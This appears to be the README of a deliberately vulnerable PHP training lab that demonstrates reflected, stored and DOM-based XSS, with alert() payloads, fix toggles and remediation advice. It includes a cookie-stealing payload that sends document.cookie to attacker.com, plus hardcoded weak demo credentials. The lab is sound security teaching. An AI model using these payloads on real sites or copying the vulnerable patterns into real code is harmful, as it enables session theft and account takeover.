# XSS Demo Lab - Gadget Store

This lab is designed to demonstrate Reflected, Stored, and DOM-based Cross-Site Scripting (XSS).

## Lab Setup
Run the built-in PHP server:
```bash
php -S localhost:8000
```

### Credentials
- **Admin**: `admin` / `admin123`
- **User**: `victim` / `password123`

## How to use the Lab (Toggle Fixes)
Each vulnerable file contains a **VULNERABLE** section and a commented-out **FIX** section. 
To test the fix:
1.  Locate the `<!-- VULNERABLE -->` block in the code.
2.  Comment it out.
3.  Uncomment the `<!-- FIX: ... -->` block.

## Attack Scenarios

### 1. Reflected XSS
- **File**: `search.php` (Search results) and `profile.php` (Success messages).
- **Payload**: `http://localhost:8000/search.php?query=<script>alert('Reflected')</script>`
- **Nature**: Input from the URL is reflected directly in the HTML response.

### 2. Stored XSS (Persistent)
- **File**: `product.php` (Customer Reviews).
- **Scenario**: Post a malicious comment. It is saved to the database and executed for everyone who views the page.
- **Payload**: Post a review with `<script>alert('Stored XSS')</script>`.
- **Practical Attack**: `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`

### 3. DOM-based XSS
- **File**: `product.php` (Welcome message script).
- **Scenario**: The script uses `innerHTML` to write data from the URL fragment (`#name=`) to the page.
- **Payload**: `http://localhost:8000/product.php?id=1#name=<img src=x onerror=alert('DOM_XSS')>`
- **Nature**: The vulnerability is entirely in the client-side JavaScript.

## Remediation Summary

- **Reflected & Stored**: Always use `htmlspecialchars($data, ENT_QUOTES, 'UTF-8')` when echoing user input in PHP.
- **DOM-based**: Use safe sinks like `textContent` instead of `innerHTML` when handling user-controlled data in JavaScript.
- **Session Security**: Use the `HttpOnly` flag on cookies to prevent theft via XSS.

---
